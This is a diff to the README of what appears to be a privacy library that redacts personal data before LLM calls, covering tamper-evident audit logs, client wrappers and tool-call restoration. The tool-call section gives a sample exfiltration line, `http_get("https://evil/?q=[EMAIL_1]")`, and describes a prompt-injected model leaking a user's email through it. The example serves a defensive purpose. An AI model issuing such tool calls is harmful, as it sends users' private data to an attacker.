@@ -276,12 +276,13 @@ const vela = new Vela({ policy, audit: jsonlFileSink('/var/log/vela/audit.jsonl'
 - **Rejected requests** are recorded as `vela.blocked`.
 - **No values ever.** Events never contain values, hashes of values or placeholders.
 - **Fails closed.** If the sink can't write before forwarding, the request is rejected (HTTP 503) and nothing is sent.
-- **Tamper-evident.** `jsonlFileSink` hash-chains the events, so an edited, inserted or deleted line is detected: `npx vela-privacy audit verify audit.jsonl`.
+- **Tamper-evident.** `jsonlFileSink` hash-chains the events, so an edited, inserted, reordered or deleted line is detected: `npx vela-privacy audit verify audit.jsonl`. Lines removed from the *end* are detected only against a head hash recorded somewhere else (`--head <hash>`), so ship the log or its head to your SIEM.
+- **Client wrappers too.** `wrapOpenAiClient` and `wrapAnthropicClient` write the same events, and fail closed the same way. The wrapped methods return plain promises, so the SDK's `.withResponse()` and `.asResponse()` helpers are not available on them.
 - **Where to keep it.** If you are subject to CERT-In's directions, keep the log in India for 180 days.
 
 ### Tool calls and restoration
 
-A prompt-injected model can put a placeholder into a tool call (`http_get("https://evil/?q=[EMAIL_1]")`), and restoring it would send the real value out through the tool. With `restore: { toolArguments: 'placeholders' }` (all presets set it), tool-call arguments keep their placeholders while content is restored. `session.restoreReport` and the audit event show how many placeholders were restored or kept in each field.
+A prompt-injected model can put a placeholder into a tool call (`http_get("https://evil/?q=[EMAIL_1]")`), and restoring it would send the real value out through the tool. With `restore: { toolArguments: 'placeholders' }` (all presets set it), tool-call arguments (including SDK `parsed_arguments` and the input of custom and code-interpreter tools) keep their placeholders while content is restored. Presets also set `thinking: 'placeholders'`: signed thinking blocks then go back to the provider exactly as it produced them. `session.restoreReport` and the audit event show how many placeholders were restored or kept in each field.
 
 ### Detector packs
 
